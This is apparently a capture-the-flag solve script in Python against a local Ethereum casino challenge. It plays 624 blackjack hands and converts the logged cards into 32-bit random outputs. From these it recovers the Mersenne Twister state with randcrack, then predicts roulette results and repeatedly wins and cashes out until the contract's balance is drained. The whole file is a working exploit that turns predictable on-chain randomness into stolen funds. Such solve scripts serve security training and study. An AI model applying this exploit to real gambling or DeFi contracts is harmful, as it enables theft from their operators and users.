#!/usr/bin/env python3
# pip install 'web3>=6,<8' randcrack requests

# add import
import os
import time
import requests
from web3 import Web3
from eth_account import Account
from randcrack import RandCrack

# add definition
Local_Ethereum_Endpoint = os.environ.get('RPC_URL', 'http://127.0.0.1:8545')
Private_Key = os.environ.get('PRIVATE_KEY')
Setup_Address = os.environ.get('SETUP_ADDRESS')

if Private_Key is None or Setup_Address is None:
    raise ValueError('Please set PRIVATE_KEY and SETUP_ADDRESS')

w3 = Web3(Web3.HTTPProvider(Local_Ethereum_Endpoint, request_kwargs={'timeout': 12}))
account = Account.from_key(Private_Key)
Setup_Address = Web3.to_checksum_address(Setup_Address)
session = requests.Session()
rpc_id = 0

# send json rpc request
class RpcError(Exception):
    pass


def rpc(method, params=None):
    global rpc_id
    if params is None:
        params = []

    for attempt in range(12):
        rpc_id += 1
        data = {'jsonrpc': '2.0', 'id': rpc_id, 'method': method, 'params': params}
        try:
            response = session.post(Local_Ethereum_Endpoint, json=data, timeout=12)
            response.raise_for_status()
            result = response.json()
            if 'error' in result:
                raise RpcError(str(result['error']))
            return result['result']
        except (requests.RequestException, ValueError) as error:
            print('RPC retry:', attempt + 1, error)
            time.sleep(min(attempt + 1, 6))

    raise ConnectionError('Cannot connect to RPC')


# create function data
# arguments in this challenge are simple uint values
def make_data(function_name, number=None):
    selector = Web3.keccak(text=function_name)[:4].hex()
    data = '0x' + selector
    if number is not None:
        data += int(number).to_bytes(32, 'big').hex()
    return data


# read a number from smart contract
def read_contract(address, function_name):
    call_data = make_data(function_name)
    result = rpc('eth_call', [{'to': address, 'data': call_data}, 'latest'])
    return int(result, 16)


# wait for dealer
def wait_dealer(address, function_name, target):
    start_time = time.monotonic()
    while time.monotonic() - start_time < 90:
        current = read_contract(address, function_name)
        if current >= target:
            return
        time.sleep(0.45)
    raise TimeoutError('Dealer did not finish')


# convert 6 cards back to a 32 bit random number
def cards_to_number(cards):
    number = 0
    for card in reversed(cards):
        number = number * 52 + int(card)
    if number >= 2 ** 32:
        raise ValueError('Invalid random number')
    return number


# get HandDealt events from blockchain
def get_hand_samples(contract_address):
    event_name = 'HandDealt(uint256,address,uint8[6],uint256)'
    event_topic = '0x' + Web3.keccak(text=event_name).hex()
    latest_block = int(rpc('eth_blockNumber'), 16)
    samples = {}

    for start_block in range(0, latest_block + 1, 1000):
        end_block = min(start_block + 999, latest_block)
        filter_data = {
            'address': contract_address,
            'fromBlock': hex(start_block),
            'toBlock': hex(end_block),
            'topics': [event_topic]
        }
        logs = rpc('eth_getLogs', [filter_data])

        for event in logs:
            hand_id = int(event['topics'][1], 16)
            if hand_id >= 624:
                continue

            event_data = bytes.fromhex(event['data'][2:])
            if len(event_data) < 6 * 32:
                raise ValueError('Invalid HandDealt event')

            cards = []
            for i in range(6):
                start = i * 32
                card = int.from_bytes(event_data[start:start + 32], 'big')
                cards.append(card)
            samples[hand_id] = cards_to_number(cards)

    return samples


# sign and send transaction
def send_transaction(contract_address, data, value=0):
    chain_id = int(rpc('eth_chainId'), 16)
    nonce = int(rpc('eth_getTransactionCount', [account.address, 'pending']), 16)
    gas_price = int(rpc('eth_gasPrice'), 16)

    transaction = {
        'from': account.address,
        'to': contract_address,
        'data': data,
        'value': value,
        'nonce': nonce,
        'chainId': chain_id,
        'gas': 500000,
        'gasPrice': gas_price
    }

    signed = account.sign_transaction(transaction)
    raw_transaction = getattr(signed, 'raw_transaction', None)
    if raw_transaction is None:
        raw_transaction = signed.rawTransaction
    transaction_hash = '0x' + Web3.keccak(raw_transaction).hex()

    try:
        rpc('eth_sendRawTransaction', ['0x' + raw_transaction.hex()])
    except RpcError as error:
        if 'already known' not in str(error) and 'nonce too low' not in str(error):
            raise

    start_time = time.monotonic()
    while time.monotonic() - start_time < 90:
        receipt = rpc('eth_getTransactionReceipt', [transaction_hash])
        if receipt is not None:
            if int(receipt['status'], 16) != 1:
                raise RuntimeError('Transaction failed: ' + transaction_hash)
            return
        time.sleep(0.5)
    raise TimeoutError('Transaction is still pending: ' + transaction_hash)


# predict roulette number
def predict_roulette(random_cracker):
    while True:
        number = random_cracker.predict_getrandbits(6)
        if number < 37:
            return number


def main():
    # get challenge contract address
    result = rpc('eth_call', [{'to': Setup_Address, 'data': make_data('TARGET()')}, 'latest'])
    Challenge_Address = Web3.to_checksum_address('0x' + result[-40:])
    print('Player:', account.address)
    print('Challenge:', Challenge_Address)

    if read_contract(Setup_Address, 'isSolved()') != 0:
        print('Already solved')
        return

    if read_contract(Challenge_Address, 'nextSpinId()') != 0:
        raise RuntimeError('Please use a new instance because roulette was already played')

    # collect 624 random numbers from blackjack
    while read_contract(Challenge_Address, 'nextUnsettledHand()') < 624:
        created = read_contract(Challenge_Address, 'nextHandId()')
        settled = read_contract(Challenge_Address, 'nextUnsettledHand()')

        if created < 624 and created - settled < 16:
            count = min(16 - (created - settled), 624 - created)
            bet = count * 11 * 10 ** 15
            send_transaction(Challenge_Address, make_data('play(uint256)', count), bet)
            print('Created hands:', created + count, '/ 624')
        else:
            wait_dealer(Challenge_Address, 'nextUnsettledHand()', min(created, 624))
            print('Settled hands:', read_contract(Challenge_Address, 'nextUnsettledHand()'))

    # recover MT19937 state
    print('Getting random numbers from events...')
    samples = get_hand_samples(Challenge_Address)
    random_cracker = RandCrack()

    for i in range(624):
        if i not in samples:
            raise ValueError('Missing hand event: ' + str(i))
        random_cracker.submit(samples[i])

    print('Recovered MT19937 state')

    # predict roulette and cash out
    for i in range(20):
        if read_contract(Setup_Address, 'isSolved()') != 0:
            break

        predicted_number = predict_roulette(random_cracker)
        spin_id = read_contract(Challenge_Address, 'nextSpinId()')
        send_transaction(Challenge_Address, make_data('spin(uint8)', predicted_number), 5 * 10 ** 17)
        wait_dealer(Challenge_Address, 'nextUnsettledSpin()', spin_id + 1)

        result = rpc('eth_call', [{
            'to': Challenge_Address,
            'data': make_data('spins(uint256)', spin_id)
        }, 'latest'])
        result_bytes = bytes.fromhex(result[2:])
        actual_number = int.from_bytes(result_bytes[3 * 32:4 * 32], 'big')

        if actual_number != predicted_number:
            raise RuntimeError('Wrong prediction: ' + str(predicted_number) + ' / ' + str(actual_number))

        print('Win:', i + 1, 'number:', predicted_number)
        send_transaction(Challenge_Address, make_data('cashOut()'))

    solved = read_contract(Setup_Address, 'isSolved()') != 0
    balance = read_contract(Challenge_Address, 'getBalance()') / 10 ** 18
    print('Solved:', solved)
    print('Contract balance:', balance, 'ETH')

    if not solved:
        raise RuntimeError('Challenge is not solved')
    print('SOLVED: use option 3 in nc service')


if __name__ == '__main__':
    main()
